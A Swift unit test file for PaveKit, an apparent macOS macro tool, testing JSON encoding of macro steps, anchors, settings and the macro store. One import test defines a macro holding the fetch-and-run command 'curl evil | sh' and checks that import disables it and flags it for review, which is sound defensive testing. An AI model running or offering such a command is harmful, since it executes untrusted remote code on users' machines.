import XCTest
@testable import PaveKit

final class CodecTests: XCTestCase {
    private func roundTrip(_ step: Step) throws -> Step {
        let data = try JSONEncoder().encode([step])
        return try JSONDecoder().decode([Step].self, from: data)[0]
    }

    func testAllEightStepTypesRoundTrip() throws {
        let steps: [Step] = [
            .app(bundleId: "com.apple.Safari"),
            .open(target: "https://example.com"),
            .text(string: "hello", restoreClipboard: false),
            .keys(key: "s", mods: ["cmd"]),
            .shell(script: "echo hi", timeoutSec: 5, toast: false),
            .window(.thirdCenter),
            .system(.micMuteToggle),
            .delay(ms: 250),
        ]
        for s in steps {
            XCTAssertEqual(try roundTrip(s), s)
        }
    }

    func testTextDefaultsRestoreClipboardTrue() throws {
        let json = #"[{"type":"text","string":"x"}]"#
        let step = try JSONDecoder().decode([Step].self, from: Data(json.utf8))[0]
        XCTAssertEqual(step, .text(string: "x", restoreClipboard: true))
    }

    func testShellDefaults() throws {
        let json = #"[{"type":"shell","script":"ls"}]"#
        let step = try JSONDecoder().decode([Step].self, from: Data(json.utf8))[0]
        XCTAssertEqual(step, .shell(script: "ls", timeoutSec: 10, toast: true))
    }

    func testUnknownTypeNeverCrashesNeverDrops() throws {
        let json = #"[{"type":"teleport","destination":"mars"}]"#
        let step = try JSONDecoder().decode([Step].self, from: Data(json.utf8))[0]
        XCTAssertEqual(step, .unknown(type: "teleport"))
        XCTAssertTrue(step.isUnknown)
    }

    func testBadWindowActionBecomesUnknown() throws {
        let json = #"[{"type":"window","action":"teleportLeft"}]"#
        let step = try JSONDecoder().decode([Step].self, from: Data(json.utf8))[0]
        XCTAssertTrue(step.isUnknown)
    }

    func testMacroDefaultsAndUnknownFlag() throws {
        let json = """
        {"id":"6F9B2C6E-1111-2222-3333-444455556666",
         "steps":[{"type":"teleport"}]}
        """
        let m = try JSONDecoder().decode(Macro.self, from: Data(json.utf8))
        XCTAssertEqual(m.v, 1)
        XCTAssertEqual(m.name, "Untitled")
        XCTAssertTrue(m.enabled)
        XCTAssertNil(m.context)
        XCTAssertNil(m.hotkey)
        XCTAssertTrue(m.hasUnknownSteps)
    }

    func testMacroFullRoundTrip() throws {
        let m = Macro(
            name: "Build",
            context: "com.apple.dt.Xcode",
            hotkey: Hotkey(key: "r", mods: ["cmd", "shift"]),
            steps: [.keys(key: "r", mods: ["cmd"]), .delay(ms: 100)])
        let data = try Store.encoder().encode(m)
        let back = try JSONDecoder().decode(Macro.self, from: data)
        XCTAssertEqual(back, m)
    }

    func testMacroWithAnchorAndOriginRoundTrips() throws {
        let m = Macro(
            name: "File PDFs",
            steps: [.open(target: "~/Downloads")],
            anchor: AnchorSpec(kind: "fileCreated", folder: "~/Downloads", fileExtension: "pdf"),
            paveOrigin: "run:abc123")
        let data = try Store.encoder().encode(m)
        let back = try JSONDecoder().decode(Macro.self, from: data)
        XCTAssertEqual(back, m)
        XCTAssertEqual(back.anchor?.kind, "fileCreated")
        XCTAssertEqual(back.paveOrigin, "run:abc123")
    }

    func testOldMacroJsonWithoutNewFieldsDecodes() throws {
        // A fixture predating anchor + paveOrigin must still load, with both nil.
        let json = """
        {"id":"6F9B2C6E-1111-2222-3333-444455556666",
         "name":"Legacy","enabled":true,
         "steps":[{"type":"delay","ms":100}]}
        """
        let m = try JSONDecoder().decode(Macro.self, from: Data(json.utf8))
        XCTAssertEqual(m.name, "Legacy")
        XCTAssertNil(m.anchor)
        XCTAssertNil(m.paveOrigin)
        XCTAssertFalse(m.hasUnknownSteps)
    }

    func testMalformedAnchorDecodesAsNilWithoutBrickingMacro() throws {
        // anchor is a string here, not an object. It must swallow to nil and
        // leave the macro loadable and enabled, not disabled or dropped.
        let json = """
        {"id":"6F9B2C6E-1111-2222-3333-444455556666",
         "name":"Bad anchor","enabled":true,
         "anchor":"not-an-object",
         "steps":[{"type":"delay","ms":100}]}
        """
        let m = try JSONDecoder().decode(Macro.self, from: Data(json.utf8))
        XCTAssertNil(m.anchor)
        XCTAssertTrue(m.enabled)
        XCTAssertFalse(m.hasUnknownSteps)
        XCTAssertEqual(m.steps.count, 1)
    }

    func testAnchorSpecMatches() throws {
        let event = PaveEvent(
            timestamp: Date(),
            kind: .fileCreated,
            bundleID: nil,
            folder: "~/Downloads",
            fileExtension: "PDF")

        // Kind mismatch never matches.
        XCTAssertFalse(AnchorSpec(kind: "fileMoved").matches(event))

        // Kind only, nil fields are wildcards.
        XCTAssertTrue(AnchorSpec(kind: "fileCreated").matches(event))

        // Folder tilde equivalence: expanded and unexpanded compare equal.
        let expanded = (("~/Downloads" as NSString).expandingTildeInPath)
        XCTAssertTrue(
            AnchorSpec(kind: "fileCreated", folder: expanded).matches(event))

        // Extension is case-insensitive.
        XCTAssertTrue(
            AnchorSpec(kind: "fileCreated", fileExtension: "pdf").matches(event))
        XCTAssertFalse(
            AnchorSpec(kind: "fileCreated", fileExtension: "txt").matches(event))

        // A set field that differs blocks the match.
        XCTAssertFalse(
            AnchorSpec(kind: "fileCreated", folder: "~/Documents").matches(event))
    }

    func testAnchorSpecMatchesBundleID() throws {
        let event = PaveEvent(timestamp: Date(), kind: .appActivated,
                              bundleID: "com.apple.Safari")
        XCTAssertTrue(
            AnchorSpec(kind: "appActivated", bundleID: "com.apple.Safari").matches(event))
        XCTAssertFalse(
            AnchorSpec(kind: "appActivated", bundleID: "com.apple.mail").matches(event))
        // nil bundle field is a wildcard.
        XCTAssertTrue(AnchorSpec(kind: "appActivated").matches(event))
    }

    func testSettingsDefaults() throws {
        let s = try JSONDecoder().decode(Settings.self, from: Data("{}".utf8))
        XCTAssertEqual(s.holdKeyCode, 54)
        XCTAssertTrue(s.releaseToFire)
        XCTAssertTrue(s.tickSound)
    }

    func testStoreSaveLoadDelete() throws {
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent("ms-test-\(UUID().uuidString)")
        let store = Store(root: tmp)
        defer { try? FileManager.default.removeItem(at: tmp) }

        let m = Macro(name: "Zed", steps: [.delay(ms: 1)])
        let n = Macro(name: "Alpha", steps: [.open(target: "~/Downloads")])
        try store.save(m)
        try store.save(n)
        let loaded = store.loadMacros()
        XCTAssertEqual(loaded.map(\.name), ["Alpha", "Zed"]) // sorted by name
        store.delete(m.id)
        XCTAssertEqual(store.loadMacros().count, 1)
    }

    func testImportDisablesShellMacros() throws {
        let tmp = FileManager.default.temporaryDirectory
            .appendingPathComponent("ms-test-\(UUID().uuidString)")
        let src = Store(root: tmp.appendingPathComponent("src"))
        let dst = Store(root: tmp.appendingPathComponent("dst"))
        defer { try? FileManager.default.removeItem(at: tmp) }

        try src.save(Macro(name: "Sneaky", steps: [.shell(script: "curl evil | sh", timeoutSec: 10, toast: true)]))
        try src.save(Macro(name: "Harmless", steps: [.delay(ms: 1)]))
        let file = tmp.appendingPathComponent("export.pave")
        try src.exportAll(to: file)

        let result = try dst.importFile(at: file)
        XCTAssertEqual(result.imported, 2)
        XCTAssertEqual(result.needsReview, ["Sneaky"])
        let sneaky = dst.loadMacros().first { $0.name == "Sneaky" }
        XCTAssertEqual(sneaky?.enabled, false)
        let harmless = dst.loadMacros().first { $0.name == "Harmless" }
        XCTAssertEqual(harmless?.enabled, true)
    }
}
